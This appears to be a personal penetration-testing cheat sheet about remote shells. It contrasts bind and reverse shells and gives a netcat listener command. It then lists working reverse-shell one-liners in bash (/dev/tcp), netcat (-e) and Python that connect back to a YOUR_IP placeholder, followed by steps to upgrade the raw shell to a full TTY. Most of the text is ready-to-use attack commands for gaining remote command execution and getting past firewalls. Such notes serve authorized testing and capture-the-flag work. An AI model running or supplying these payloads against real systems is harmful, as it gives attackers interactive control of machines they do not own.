#cheatsheets

## Bind vs reverse
| Type | Mechanism | Use when |
| --- | --- | --- |
| Bind shell | Exploit opens a listener on the **target** | Target has no firewall blocking inbound |
| Reverse shell | **Target** connects back to **you** | Bypasses firewalls that block inbound but allow outbound (the common case) |

Reverse is what you'll use almost always. Get your listener running *before* triggering the payload:
```bash
nc -lvnp 4444
```
See [[netcat]] for listener/file-transfer detail.

## Common one-liners
```bash
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
nc -e /bin/sh YOUR_IP PORT                       # if nc has -e compiled in
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## How to know you're in a raw one
What you land in from a reverse shell payload is usually a bare pipe, not a real terminal (TTY). Signs:
- Tab doesn't autocomplete
- Arrow keys print garbage (`^[[A`) instead of recalling history
- Ctrl+C kills the whole shell instead of just the running command
- `su`, `passwd`, `vim`, `top` hang or error (`not a tty`, `TERM environment variable not set`)
- `tty` reports `not a tty`

## Stabilizing it
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background it
stty raw -echo; fg
export TERM=xterm
```
Now job control, Ctrl+C, and full-screen tools (vim, etc.) behave normally.
